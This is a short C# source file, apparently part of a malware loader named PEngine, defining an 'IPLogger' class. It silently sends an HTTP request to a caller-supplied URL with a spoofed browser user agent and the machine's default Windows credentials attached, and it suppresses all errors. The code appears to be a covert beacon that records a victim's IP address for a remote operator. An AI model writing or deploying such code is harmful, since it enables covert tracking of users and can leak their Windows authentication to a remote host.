namespace PEngine.Loader
{
    using System.Net;

    public class IPLogger
    {
        public static bool Sender(string Url)
        {
            try
            {
                if (!string.IsNullOrEmpty(Url)) 
                {
                    HttpWebRequest request = WebRequest.CreateHttp(Url);
                    request.Credentials = CredentialCache.DefaultCredentials;
                    request.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
                    request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
                    using (WebResponse response = request.GetResponse())
                    {
                        return true;
                    }
                }
                else
                {
                    return false;
                }
            }
            catch { return false; }
        }
    }
}